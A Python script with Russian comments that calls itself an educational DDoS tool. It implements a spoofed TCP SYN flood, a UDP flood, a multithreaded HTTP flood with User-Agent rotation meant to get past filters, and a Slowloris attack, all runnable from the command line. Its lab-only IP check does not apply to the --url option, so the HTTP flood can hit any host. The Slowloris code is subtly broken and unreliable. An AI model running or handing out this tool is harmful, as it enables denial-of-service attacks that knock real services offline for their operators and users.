#!/usr/bin/env python3
"""
Образовательный скрипт для изучения DDoS атак
ВНИМАНИЕ: Только для использования в собственной лабораторной среде!

Автор: Образовательный материал для изучения кибербезопасности
Лицензия: Только для образовательных целей
"""

import socket
import threading
import time
import random
import argparse
import sys
from urllib.parse import urlparse
import requests
from scapy.all import *

class EducationalDDoSTool:
    """
    Образовательный инструмент для демонстрации различных типов DDoS атак
    """
    
    def __init__(self, target_ip, target_port=80):
        self.target_ip = target_ip
        self.target_port = target_port
        self.attack_running = False
        self.thread_count = 0
        
        # Проверка безопасности - только локальные адреса
        if not self._is_safe_target(target_ip):
            print("❌ ОШИБКА: Этот скрипт можно использовать только для локальных адресов!")
            print("Разрешенные адреса: 127.0.0.1, 192.168.x.x, 10.x.x.x, 172.16-31.x.x")
            sys.exit(1)
    
    def _is_safe_target(self, ip):
        """
        Проверяет, является ли целевой IP безопасным для тестирования
        Разрешены только локальные и частные сети
        """
        safe_ranges = [
            '127.',          # localhost
            '192.168.',      # частная сеть класса C
            '10.',           # частная сеть класса A
        ]
        
        # Проверка частной сети класса B (172.16.0.0 - 172.31.255.255)
        if ip.startswith('172.'):
            third_octet = int(ip.split('.')[1])
            if 16 <= third_octet <= 31:
                return True
        
        return any(ip.startswith(prefix) for prefix in safe_ranges)
    
    def tcp_flood(self, duration=60):
        """
        TCP SYN Flood атака
        Отправляет множество TCP SYN пакетов, не завершая handshake
        """
        print(f"🚀 Запуск TCP SYN Flood атаки на {self.target_ip}:{self.target_port}")
        print(f"⏱️  Продолжительность: {duration} секунд")
        
        self.attack_running = True
        start_time = time.time()
        packet_count = 0
        
        while self.attack_running and (time.time() - start_time) < duration:
            try:
                # Создаем случайный исходный IP (спуфинг)
                src_ip = f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"
                src_port = random.randint(1024, 65535)
                
                # Создаем TCP SYN пакет с помощью Scapy
                packet = IP(src=src_ip, dst=self.target_ip) / \
                        TCP(sport=src_port, dport=self.target_port, flags="S")
                
                # Отправляем пакет
                send(packet, verbose=0)
                packet_count += 1
                
                if packet_count % 1000 == 0:
                    print(f"📊 Отправлено {packet_count} SYN пакетов...")
                    
            except Exception as e:
                print(f"❌ Ошибка при отправке пакета: {e}")
                time.sleep(0.1)
        
        self.attack_running = False
        print(f"✅ TCP SYN Flood завершен. Всего отправлено: {packet_count} пакетов")
    
    def udp_flood(self, duration=60):
        """
        UDP Flood атака
        Отправляет случайные UDP пакеты на различные порты
        """
        print(f"🚀 Запуск UDP Flood атаки на {self.target_ip}")
        print(f"⏱️  Продолжительность: {duration} секунд")
        
        self.attack_running = True
        start_time = time.time()
        packet_count = 0
        
        while self.attack_running and (time.time() - start_time) < duration:
            try:
                # Случайные данные для UDP пакета
                payload = random._urandom(random.randint(64, 1024))
                target_port = random.randint(1, 65535)
                
                # Создаем UDP пакет
                packet = IP(dst=self.target_ip) / UDP(dport=target_port) / payload
                
                # Отправляем пакет
                send(packet, verbose=0)
                packet_count += 1
                
                if packet_count % 500 == 0:
                    print(f"📊 Отправлено {packet_count} UDP пакетов...")
                    
            except Exception as e:
                print(f"❌ Ошибка при отправке UDP пакета: {e}")
                time.sleep(0.1)
        
        self.attack_running = False
        print(f"✅ UDP Flood завершен. Всего отправлено: {packet_count} пакетов")
    
    def http_flood_worker(self, url, duration):
        """
        Рабочий поток для HTTP flood атаки
        """
        start_time = time.time()
        request_count = 0
        
        # Случайные User-Agent для обхода простых фильтров
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101',
        ]
        
        while self.attack_running and (time.time() - start_time) < duration:
            try:
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                }
                
                # Отправляем GET запрос
                response = requests.get(url, headers=headers, timeout=5)
                request_count += 1
                
            except requests.exceptions.RequestException:
                # Игнорируем ошибки соединения - это ожидаемо при DDoS
                request_count += 1
                pass
            except Exception as e:
                time.sleep(0.1)
        
        print(f"🧵 Поток завершен. Отправлено {request_count} HTTP запросов")
        self.thread_count -= 1
    
    def http_flood(self, url, duration=60, threads=50):
        """
        HTTP Flood атака
        Отправляет множество HTTP запросов для перегрузки веб-сервера
        """
        print(f"🚀 Запуск HTTP Flood атаки на {url}")
        print(f"⏱️  Продолжительность: {duration} секунд")
        print(f"🧵 Количество потоков: {threads}")
        
        self.attack_running = True
        self.thread_count = threads
        
        # Запускаем потоки
        for i in range(threads):
            thread = threading.Thread(
                target=self.http_flood_worker, 
                args=(url, duration)
            )
            thread.daemon = True
            thread.start()
            time.sleep(0.01)  # Небольшая задержка между запуском потоков
        
        # Ждем завершения
        time.sleep(duration)
        self.attack_running = False
        
        # Ждем завершения всех потоков
        while self.thread_count > 0:
            time.sleep(1)
        
        print("✅ HTTP Flood атака завершена")
    
    def slowloris_attack(self, duration=300):
        """
        Slowloris атака
        Медленно отправляет HTTP заголовки, держа соединения открытыми
        """
        print(f"🐌 Запуск Slowloris атаки на {self.target_ip}:{self.target_port}")
        print(f"⏱️  Продолжительность: {duration} секунд")
        
        self.attack_running = True
        sockets = []
        
        try:
            # Создаем множество соединений
            for i in range(200):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((self.target_ip, self.target_port))
                    
                    # Отправляем начальный HTTP запрос
                    sock.send(b"GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode())
                    sock.send(b"Host: {}\r\n".format(self.target_ip).encode())
                    sock.send(b"User-Agent: Mozilla/5.0 (Educational DDoS Tool)\r\n")
                    sock.send(b"Accept-language: en-US,en,q=0.5\r\n")
                    
                    sockets.append(sock)
                    
                except socket.error:
                    break
            
            print(f"📡 Установлено {len(sockets)} соединений")
            
            start_time = time.time()
            while self.attack_running and (time.time() - start_time) < duration:
                # Отправляем дополнительные заголовки для поддержания соединений
                for sock in sockets[:]:
                    try:
                        sock.send(b"X-a: {}\r\n".format(random.randint(1, 5000)).encode())
                    except socket.error:
                        sockets.remove(sock)
                
                # Создаем новые соединения взамен закрытых
                for i in range(len(sockets), 200):
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(4)
                        sock.connect((self.target_ip, self.target_port))
                        sock.send(b"GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode())
                        sockets.append(sock)
                    except socket.error:
                        break
                
                print(f"🔄 Активных соединений: {len(sockets)}")
                time.sleep(15)
        
        finally:
            # Закрываем все соединения
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass
            
            self.attack_running = False
            print("✅ Slowloris атака завершена")

def main():
    """
    Главная функция для запуска образовательного DDoS инструмента
    """
    print("=" * 60)
    print("🎓 ОБРАЗОВАТЕЛЬНЫЙ DDoS ИНСТРУМЕНТ")
    print("=" * 60)
    print("⚠️  ВНИМАНИЕ: Только для использования в собственной лаборатории!")
    print("⚠️  Использование против чужих систем НЕЗАКОННО!")
    print("=" * 60)
    
    parser = argparse.ArgumentParser(description='Образовательный DDoS инструмент')
    parser.add_argument('target', help='IP адрес цели (только локальные сети)')
    parser.add_argument('-p', '--port', type=int, default=80, help='Порт цели (по умолчанию 80)')
    parser.add_argument('-t', '--type', choices=['tcp', 'udp', 'http', 'slowloris'], 
                       default='http', help='Тип атаки')
    parser.add_argument('-d', '--duration', type=int, default=60, 
                       help='Продолжительность атаки в секундах')
    parser.add_argument('--threads', type=int, default=50, 
                       help='Количество потоков для HTTP атаки')
    parser.add_argument('--url', help='URL для HTTP атаки (если не указан, используется http://target:port/)')
    
    args = parser.parse_args()
    
    # Создаем экземпляр инструмента
    ddos_tool = EducationalDDoSTool(args.target, args.port)
    
    try:
        if args.type == 'tcp':
            ddos_tool.tcp_flood(args.duration)
        elif args.type == 'udp':
            ddos_tool.udp_flood(args.duration)
        elif args.type == 'http':
            url = args.url or f"http://{args.target}:{args.port}/"
            ddos_tool.http_flood(url, args.duration, args.threads)
        elif args.type == 'slowloris':
            ddos_tool.slowloris_attack(args.duration)
            
    except KeyboardInterrupt:
        print("\n🛑 Атака прервана пользователем")
        ddos_tool.attack_running = False
    except Exception as e:
        print(f"❌ Ошибка: {e}")
    
    print("\n📚 Образовательная информация:")
    print("• TCP SYN Flood - исчерпывает таблицу соединений")
    print("• UDP Flood - перегружает сеть случайным трафиком") 
    print("• HTTP Flood - перегружает веб-сервер запросами")
    print("• Slowloris - исчерпывает пул соединений медленными запросами")
    print("\n🛡️  Методы защиты:")
    print("• Rate limiting и DDoS protection")
    print("• Firewall правила и геоблокировка")
    print("• Load balancing и CDN")
    print("• Мониторинг трафика и автоматическое блокирование")

if __name__ == "__main__":
    main()
